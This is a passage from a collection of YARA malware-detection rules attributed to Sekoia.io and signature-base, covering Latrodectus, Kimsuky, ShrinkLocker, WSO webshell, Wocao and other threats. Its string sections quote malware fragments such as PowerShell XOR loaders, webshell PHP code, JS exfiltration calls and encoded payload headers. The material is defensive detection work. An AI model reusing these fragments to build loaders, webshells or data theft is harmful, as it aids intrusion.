		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "ffd84d0c7064bcd69121aa606bc642ff2b5c9927ba622260a02a9689c7ab8878"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "CleanUp30.dll" ascii fullword
		$s2 = "MSTeamsSetup_c_l_.exe" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Latrodectus_Br4_Js_Dropper_2
{
	meta:
		description = "Detect the JS script used to drop Latrodectus"
		author = "Sekoia.io"
		id = "042a598d-66fa-4994-a793-228355abd5dd"
		date = "2024-06-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/latrodectus_br4_js_dropper.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a835bd9a9ad68fd2f285ec5c04a5c78ba5ca85381ff30048ac375bef220fd72f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = " installer.InstallProduct(msiPath);" ascii
		$s2 = "new ActiveXObject(\"WindowsInstaller.Installer\");" ascii

	condition:
		all of them
}

rule SEKOIA_Downloader_Kimsuky_Lnk_2
{
	meta:
		description = "Detect Kimsuky LNK"
		author = "Sekoia.io"
		id = "3831d115-7874-4bc9-aeb4-d2cb9bc2b5c9"
		date = "2024-07-16"
		modified = "2024-12-19"
		reference = "https://blogs.jpcert.or.jp/en/2024/07/attack-activities-by-kimsuky-targeting-japanese-organizations.html"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_kimsuky_lnk.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3512c8c21203a015b316c2a993db1a8c10420df06ea97d84a6e350550a628230"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "3065b8e4bb91b4229d1cea671e8959da8be2e7482067e1dd03519c882738045e"
		hash2 = "d912f49d24792aa7197509f76e2097ac3858cde23199e1b40f2516948d39c589"
		hash3 = "e936445935c4a636614f7113e4121695a5f3e4a6c137b7cdcceb6f629aa957c4"
		hash4 = "fe156159a26f8b7c140db61dd8b136e1c8103a800748fe9b70a3a3fdf179d3c3"

	strings:
		$ = "AType: Text Document" wide
		$ = "Size: 5.23 KB" wide
		$ = "Date modified: 01/02/2020 11:23" wide

	condition:
		all of them
}

rule SEKOIA_Koi_Powershell_Loading_Obfuscatednet_2
{
	meta:
		description = "Powershell script loading obfuscated .NET Koi module"
		author = "Sekoia.io"
		id = "75a7460d-cc28-470e-9841-da8e46ee0101"
		date = "2024-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/koi_powershell_loading_obfuscatednet.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "82f30c04474ea77af5169771a2c0e75ba792fd32dc559b8c29172b73ace4ef10"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "# [Net.ServicePointManager]::SecurityProtocol +='tls12'"
		$s2 = "$binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]"
		$s3 = "\").Split('|')"
		$s4 = "$ep.Invoke($null, "

	condition:
		$s3 and 3 of them
}

rule SEKOIA_Ransomware_Win_Shrinklocker_2
{
	meta:
		description = "Detects files related to the ShrinkLocker ransomware"
		author = "Sekoia.io"
		id = "93a6fbdd-ad62-456a-a1a5-b5ae3b242004"
		date = "2024-06-07"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_shrinklocker.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "7770b0946b9bb482f23c4ce0d753393e0d42a6fd8b31029847d74356296f0cf1"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$a = "shrinkdisk" ascii fullword
		$b = "BitLocker" ascii fullword
		$c = "diskpart" ascii fullword
		$d = "disk.vbs" ascii fullword
		$e = "strDriveLetter" ascii fullword
		$f = "shrinkcomplate" ascii fullword
		$g = "ADODB.Stream" ascii fullword
		$h = "Win32_OperatingSystem" ascii fullword
		$i = "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" ascii fullword
		$j = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii fullword
		$k = "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE" ascii fullword

	condition:
		9 of them
}

rule SEKOIA_Apt_Reaper_2Fa_Phishing_Webpage_2
{
	meta:
		description = "Detects Reaper 2FA phishing webpage"
		author = "Sekoia.io"
		id = "348ca2ad-c8f9-4aed-8a27-95caa3a34f4b"
		date = "2023-03-09"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_reaper_2fa_phishing_webpage.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "3f0ae0b35ea181b4712feeb34e866519921917179297148982e5298df9f133a9"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "setTimeout(checkUpload,"
		$ = "commChannel.addListener("
		$ = "else if(commType =="
		$ = "?dir=DOWN&method=READ&id="
		$ = "Content : base64_encode(upload_data)"
		$ = "$.post(upHttpRelayer"
		$ = "var ablyUpData = {"
		$ = "initComm();"
		$ = "function Next(arg) {"

	condition:
		3 of them
}

rule SEKOIA_Apt_Unc4990_Explorer_Ps1_2
{
	meta:
		description = "Detects powershell script (explorer.ps1)"
		author = "Sekoia.io"
		id = "2e1abbbf-f9b7-4147-b7da-3544cbc4a5f1"
		date = "2024-02-01"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unc4990_explorer_ps1.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5085f738e23b801c7e36408d189755086d91c0bb266af6738c80510eb85e598f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = "$(get-location).Path"
		$s1 = "+ \"\\Runtime Broker.exe"
		$s2 = "Start-Process -FilePath"
		$s3 = "-Wait;"
		$s4 = "Start-Sleep -s"

	condition:
		all of them and @s3- @s2 < 35
}

rule SEKOIA_Apt_Apt37_Chinotto_Powershell_Variant_2
{
	meta:
		description = "Detects APT37 Chinotto Powershell Variant"
		author = "Sekoia.io"
		id = "fa42b225-58fe-4e00-b84b-df37491d8fdd"
		date = "2023-03-06"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt37_chinotto_powershell_variant.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b4d17467f15d52bd615e335fa8bc31381ec273b67dabb74655f47179f04f631f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$env:COMPUTERNAME + '-' + $env:USERNAME;" ascii wide
		$ = "while($true -eq $true)" ascii wide
		$ = "Start-Sleep -Seconds" ascii wide
		$ = " -ne 'null' -and $" ascii wide
		$ = "= 'R=' + [System.Convert]::" ascii wide
		$ = "[string]$([char]0x0D) + [string]$([char]0x0A);" ascii wide

	condition:
		4 of them
}

rule SEKOIA_Ransomware_Win_Raworld_2
{
	meta:
		description = "Detects files related to stage 1 of a campaign from the ransomware group RA World."
		author = "Sekoia.io"
		id = "a9ed9c5a-7a0e-4c2e-90f4-d52f5589b2b8"
		date = "2024-07-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/ransomware_win_raworld.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "583dd2ea8e20a87d0b67783d1dd59212eb133de1f945d5b4afad89e8a5017d35"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Loder.exe" ascii fullword
		$s2 = "Stage2.exe" wide
		$s3 = "SYSVOL" wide
		$s4 = "Finish.exe" wide
		$s5 = "Exclude.exe" wide
		$s6 = "Stage3.exe" wide
		$s7 = "Pay.txt" ascii fullword
		$s8 = "RA World" ascii fullword
		$s9 = "Stage1.exe" ascii fullword

	condition:
		4 of them
}

rule SEKOIA_Keylogger_Win_Donot_2
{
	meta:
		description = "Detect the DoNot's keylogger malware"
		author = "Sekoia.io"
		id = "4f67dda7-da68-4496-a8b4-a8a769ddd763"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/keylogger_win_donot.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "eb935f84335e934346511b4108f70df469deef6ecaaba809c144197c04a28f64"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "iwrct2mTFAu0ew1nyqQgoaNtNo0+52R0XiTKbwy1W48Bn1b2YcNt0+tptyY6oGoAeLDGekM/yHcdikNGi8bLqkUQ8CIdkWeT3QiympOTfjs="
		$ = "ZmVwZW9kbWZ2c24ucHMuZ3h4LngweXBvdWpkYm1qcXE7YnFmVXp1LmZvb3VEcA=="

	condition:
		1 of them
}

rule SEKOIA_Apt_Kimsuky_Sharptongue_C2_Source_2
{
	meta:
		description = "Detects the PHP code of the SharpTongue C2"
		author = "Sekoia.io"
		id = "a2ccf773-511c-4088-8bcf-b923291d024b"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharptongue_c2_source.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c301a99876cfe2863546c990654aa922f9327e0eb010968eaea43f1d8ced76da"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<?php"
		$ = "foreach($_GET as $variable => $value)"
		$ = "$chk=$value"
		$ = "base64_encode($ip)"

	condition:
		all of them
}

rule SEKOIA_Tool_Xiebroc2_Strings_2
{
	meta:
		description = "Detects XiebroC2 based on strings"
		author = "Sekoia.io"
		id = "8451878e-5371-440b-b8ac-f9e6f7643d3c"
		date = "2024-09-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_xiebroc2_strings.yar#L1-L40"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "84e665bcbf963a2cf67d879aa3422d79"
		hash = "3558c376420724694ba244a2e2acd20c"
		hash = "e29fb9cd825db51a7a2e519f188e61ba"
		hash = "a3b31739ad5eed51277c8478a83160a3"
		hash = "d6e2499ea7fe8f047da1a95dae16d2c3"
		hash = "1616818b65bf49d985bb1816461a4a75"
		hash = "2e72d3ef2492088a4623d77d5e419ab8"
		hash = "351770f860507d652ec3644ed1988f7f"
		hash = "58fa6ad96028753ba8b0b0ed8fa6dccb"
		hash = "607b541525b27eeefbef1455397bff35"
		hash = "c2a242612468814e2e951e4db3762059"
		hash = "431e275f4e43ec4ef7c2cc8ba126e9d3"
		hash = "ace54bd32c226a7b9a6d4d53791e4021"
		hash = "f22c21ed7bba1ddfc42ffdc66da3a4dd"
		hash = "9a5ff9e07ed04cb0e71102cf1aae380c"
		hash = "d20e01a1af3f40a7a9646d7e7df1b42e"
		hash = "5544b621c9772cd32c4db77a0e59515a"
		logic_hash = "f3be31e0f1ad8e8bce132d861de5068340653547d786378f9b8045382f40939f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RemarkClientColor"
		$s2 = "HandlePacket"
		$s3 = "-hide"
		$s4 = "Failed to send data:"
		$s5 = "Pac_ket"
		$s6 = "WANip"
		$s7 = "%s %s && Kernel: %s"
		$g1 = "go.buildid"
		$g2 = "dep    golang.org"

	condition:
		3 of ( $s* ) and any of ( $g* )
}

rule SEKOIA_Spyware_And_Bahamut_2
{
	meta:
		description = "Detect Bahamut's spyware based on common information gathering function names"
		author = "Sekoia.io"
		id = "d416997e-baf1-412c-bf39-905a6e19b65e"
		date = "2022-11-23"
		modified = "2024-12-19"
		reference = "https://www.welivesecurity.com/2022/11/23/bahamut-cybermercenary-group-targets-android-users-fake-vpn-apps/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/spyware_and_bahamut.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5f44c938fed9b32eaf183be979a67e0c7fde409e72875359105ad7ffb393893d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "c51dc2132c830c560aaeae4bf48e5f0d28c84b36d27840b5c2ba170d87f4afa5"
		hash2 = "d7e2cf642b236dba9ba0cbe5a9dc28baf22477973d5ce163e21ec40f5f26e078"

	strings:
		$ = "FbDao"
		$ = "SignalDao"
		$ = "conionDao"

	condition:
		all of them
}

rule SEKOIA_Webshell_Wso_Webshell_Strings_2
{
	meta:
		description = "Detects the WSO webshells"
		author = "Sekoia.io"
		id = "84340792-73a4-4d61-9957-6cfa1f6444a7"
		date = "2022-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/webshell_wso_webshell_strings.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "4d6966a34dc8e7390913857144da106affea14668d1c2c11a05be62a6e625c8f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "decrypt($str,$pwd){$pwd=base64_encode($pwd);"
		$ = "prototype(md5($_SERVER['HTTP_HOST'])"
		$ = "$_COOKIE[md5($_SERVER['HTTP_HOST'])."
		$ = "set(a,c,p1,p2,p3,charset)"
		$ = "(($p & 0x0008) ? (($p & 0x0400)"
		$ = "gcc','lcc','cc','ld','make','php"

	condition:
		3 of them
}

rule SEKOIA_Apt_Uta0178_Javascript_Inclusion_Strings_2
{
	meta:
		description = "Detects UTA0178 malicious inclusion strings"
		author = "Sekoia.io"
		id = "af816c35-1f00-47ea-86ee-c034607c625e"
		date = "2024-01-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_uta0178_javascript_inclusion_strings.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3fedf49417178df374d6ae20e57ffcfa00cb68a647769964c049d9a8e0f4958"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = ".value"
		$s1 = "btoa("
		$s2 = "https://"
		$s3 = "new XMLHttpRequest();"
		$s4 = ".send(null);"

	condition:
		@s0< @s1 and @s1 < @s2 and @s2 < @s3 and @s3 < @s4 and @s4- @s0 < 350
}

rule SEKOIA_Apt_Spikedwine_Malicious_Hta_2
{
	meta:
		description = "Detects malicious HTA used by SPIKEDWINE"
		author = "Sekoia.io"
		id = "e4526142-d98a-bf35-9d2c-ca2e83638c4b"
		date = "2024-02-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_spikedwine_malicious_hta.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "305896cde5d95c29de511541a961063730709d40d67a8788f084c17f181e3baf"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID=" nocase
		$ = "return _0x"
		$ = "font-size: 18px;"

	condition:
		all of them
}

rule SEKOIA_Downloader_Win_Donot_2
{
	meta:
		description = "Detect the DoNot's downloader malware. There are big binaries in downloader strings."
		author = "Sekoia.io"
		id = "31b153cc-a4b9-40a0-8bcb-ce1370645b4b"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_donot.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f6a03e6cfda74c1fbb1e8939a66735498d604a821b8b51492c2c5c6a46a38b6e"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "001100000011000100110001001100000011000000110000001100010011000100110000001100010011000100110000001100010011000100110000001100010011"
		$ = "01010011011011110110011001110100011101110110000101110010011001010101110001001101011010010110001101110010011011110111001101101111011001100111010001011100010101110110100101101110011001000110111101110111011100110101110001000011011101010111001001110010011001010110111001110100010101100110010101110010011100110110100101101111011011100101110001010101011011100110100101101110011100110111010001100001011011000110110000000000"
		$ = "0101110001110011011110010111001101110100011001010110110100110011001100100101110001110010011101010110111001100100011011000110110000110011001100100010111001100101011110000110010100000000"

	condition:
		1 of them
}

rule SEKOIA_Clipper_Win_Atlas_Strings_2
{
	meta:
		description = "Detects Atlas Clipper"
		author = "Sekoia.io"
		id = "f08c6af6-c325-4f7d-8686-575b25550d6a"
		date = "2023-07-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/clipper_win_atlas_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c8ad062b69dfe996a488ee9c79f0e7e0016f57f5b54fc39aeb4e207d2a42aa75"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "C:/Users/box/Desktop/ATLAS/ATLAS/main.go" ascii
		$s2 = "ATLAS Clipper" ascii
		$s3 = "Victim: %s" ascii
		$s4 = "Attacker: %s" ascii
		$s5 = "Install Path: %s" ascii
		$s6 = "HWID: %s" ascii
		$s7 = "Install Date: %s" ascii
		$s8 = "https://t.me/atlasclipper_channel" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_NFS_Fuse_NFS_2
{
	meta:
		description = "Detects the nfs-security-tooling fuse_nfs by HvS Consulting"
		author = "Moritz Oettle"
		id = "287fbe7d-ee1c-58a4-aa2d-9d9bec8321b4"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L1-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bd3714b865d77660404e5f3ed1e9c7b55aadc6f58d16761111be57597784686"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "NFS3ConnectionFactory" fullword ascii
		$s2 = "fuse_to_nfs_timestamp" fullword ascii
		$s3 = "--manual-fh" fullword ascii
		$s4 = "--fake-uid-allow-root" fullword ascii
		$s5 = "nfs.rpc.credential" fullword ascii
		$s6 = "nfs.readlink" fullword ascii
		$s7 = "pyfuse3.EntryAttributes" fullword ascii
		$s8 = "Make nested exports on NetApp servers work" fullword ascii
		$s9 = "add_mutually_exclusive_group" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_HKTL_NFS_NFS_Analyze_2
{
	meta:
		description = "Detects the nfs-security-tooling nfy_analyze by HvS Consulting"
		author = "Marc Stroebel"
		id = "3350d0ae-e638-5c8f-a578-ba0ac5521053"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L26-L53"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "83a9e5b5b404bf28b0334611fe4f38227212783cecea3c9996d23cb00cad42ed"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "no_root_squash_exports" fullword ascii
		$s2 = "nfs lock manager" fullword ascii
		$s3 = "netapp partner" fullword ascii
		$s4 = "xdrdef.mnt3_type" fullword ascii
		$s5 = "BTRFS subvolumes" fullword ascii
		$s6 = "Unsupported fsid" fullword ascii
		$s7 = "nfs3_read_etc_shadow" fullword ascii
		$s8 = "nfs3_check_no_root_squash" fullword ascii
		$s9 = "krb5i" fullword ascii
		$s10 = "nfs4_overview" fullword ascii
		$s11 = "--btrfs-subvolumes" fullword ascii
		$s12 = "when escaping a BTRFS export" fullword ascii
		$s13 = "No NFS server detected" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_Dropper_2
{
	meta:
		description = "Strings from PowerShell dropper of CSharp version of Agent"
		author = "Fox-IT SRT"
		id = "833ce607-56a9-5580-bbd1-e72392945fec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L24-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "19f56e69685ae8c13b9dd884f8322915835c16e2c6313f01f9fa447218419108"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "function format([string]$source)"
		$b = "foreach($c in $bb){$tt = $tt + [char]($c -bxor"
		$c = "[agent]::Main($args);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_B64Encoded_2
{
	meta:
		description = "Piece of Base64 encoded data from Agent CSharp version"
		author = "Fox-IT SRT"
		id = "14e1702d-6229-5989-8bb7-cc9c0c321676"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L40-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "bcf9a75dbbf90044db76c56ffd07971d4252b0e75d73abf402ca4fadbfb59767"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "LFNVT0hBBnVfVVJDSx0sU1VPSEEGdV9VUkNLCG9pHSxTVU9IQQZ1X1VSQ0sIZUlK"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Py_B64Encoded_2
{
	meta:
		description = "Piece of Base64 encoded data from Agent Python version"
		author = "Fox-IT SRT"
		id = "eb2701e9-4358-5d24-bfcd-b4dde24f13bf"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L77-L89"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "279fb27637d9b62b484283f778215d042de9fb83110a233e048452e921c540ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "QlpoOTFBWSZTWWDdHjgABDTfgHwQe////z/v/9+////6YA4cGPsAl2e8M9LSU128"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Keylogger_Py_2
{
	meta:
		description = "Strings from Python keylogger"
		author = "Fox-IT SRT"
		id = "f7b5ec1b-669e-5e7d-a9d3-011d212eb363"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L91-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2dc2ce153d559d795f302f5ca4a9ef9e6e5c54762472e38e6f4a26ef8a28a184"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "c:\\windows\\temp\\tap.tmp"
		$b = "c:\\windows\\temp\\mrteeh.tmp"
		$c = "GenFileName"
		$d = "outfile"
		$e = "[PASTE:%d]"

	condition:
		3 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_B64Encoded_2
{
	meta:
		description = "Piece of Base64 encoded data from the XServer PowerShell dropper"
		author = "Fox-IT SRT"
		id = "01e38cfb-b245-5398-b037-6d1d2fb726ee"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L143-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "77315f0fc8387fa87892fc8fcea1f6e8a95560049aaa9a87519859020d0a7a3e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header_47000 = "5T39c9u2kr/nr2A0Ny2VKIzkfLRJntuJHafPN/nwWG777rUZDy3BNq8UqSEpx26b"
		$header_25667 = "5T1rc9u2st/zKxjNmZZKFEZyErdJ6nZsx+nxnTjxWGp77mkzHlqCbd5SpIak/Gjr"

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_Dropper_2
{
	meta:
		description = "Strings from the PowerShell dropper of XServer"
		author = "Fox-IT SRT"
		id = "97169ab4-d68d-5137-83de-d9cac975747e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L157-L168"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "640c9e52f3cf3df4e954177624e6fba4bab80a2c9442b718fe90e8577dafbbd6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$encfile = "New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encfile)"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Timeliner_Bin_2
{
	meta:
		description = "Timeliner utility"
